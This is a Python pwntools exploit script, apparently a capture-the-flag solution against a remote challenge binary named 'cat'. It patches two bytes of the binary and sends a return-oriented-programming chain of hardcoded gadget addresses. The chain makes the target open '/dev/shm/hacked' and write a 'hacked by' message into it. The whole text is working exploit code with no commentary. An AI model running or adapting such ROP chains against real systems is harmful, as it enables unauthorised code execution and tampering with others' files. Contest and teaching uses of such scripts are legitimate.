#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = "info"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]

LOCAL = 0
filename = "./cat"
if LOCAL:
    io = process([filename, "./secret", "-"])
else:
    remote_service = "202.38.93.141:31339"
    remote_service = remote_service.strip().split(":")
    io = remote(remote_service[0], int(remote_service[1]))


i2b = lambda x: str(x).encode()

if not LOCAL:
    io.recvline()
    io.sendline(input("Input your token: ").encode())

    io.recvuntil(b"[*] How many bytes do you want to modify?")
    io.sendline(i2b(2))
    io.recvuntil(b"[*] Enter offset: ")
    io.sendline(i2b(0x2F87 + 3))
    io.recvuntil(b"[*] Enter data: ")
    io.sendline(i2b(0))

    io.recvuntil(b"[*] Enter offset: ")
    io.sendline(i2b(0x2F03 + 3))
    io.recvuntil(b"[*] Enter data: ")
    io.sendline(i2b(0))

    io.recvuntil(b"RUNNING!\n")


writable_buffer = 0x40D360
open_plt = 0x4026D0
write_plt = 0x402460
ctl_rdi = 0x0000000000406E0E  # pop rdi ; pop rbp ; ret
ctl_rsi_2 = 0x0000000000406E0C  # pop rsi ; pop r15 ; pop rbp ; ret
ctl_rdx = 0x0000000000407E75  # pop rdx ; pop rbp ; ret
magic_1 = (
    0x0000000000407882  # mov dword ptr [rbp - 8], esi ; mov eax, 0 ; pop rbp ; ret
)
write_dword = (
    lambda addr, data: p64(ctl_rsi_2)
    + p64(data)
    + p64(0)
    + p64(addr + 0x8)
    + p64(magic_1)
    + p64(0)
)

evil_filename = b"/dev/shm/hacked\x00"
message = "hacked by eastXueLian".encode()


def write_str(data):
    res = b""
    length = len(data)
    for i in range(length // 4):
        res += write_dword(
            writable_buffer + i * 4,
            int.from_bytes(data[i * 4 : i * 4 + 4], byteorder="little"),
        )
    if length % 4:
        res += write_dword(
            writable_buffer + (length // 4) * 4,
            int.from_bytes(data[(length // 4) * 4 :], byteorder="little"),
        )
    return res


rop_chain = b"a" * 8
rop_chain += write_str(evil_filename)

rop_chain += p64(ctl_rdi) + p64(writable_buffer) + p64(0)
rop_chain += p64(ctl_rsi_2) + p64(66) + p64(0) * 2
rop_chain += p64(open_plt)

rop_chain += write_str(message)

rop_chain += p64(ctl_rdi) + p64(0) + p64(0)
rop_chain += p64(ctl_rsi_2) + p64(writable_buffer) + p64(0) + p64(writable_buffer)
rop_chain += p64(ctl_rdx) + p64(len(message)) + p64(0)
rop_chain += p64(write_plt)

io.send(rop_chain)
io.shutdown_raw("send")
io.interactive()
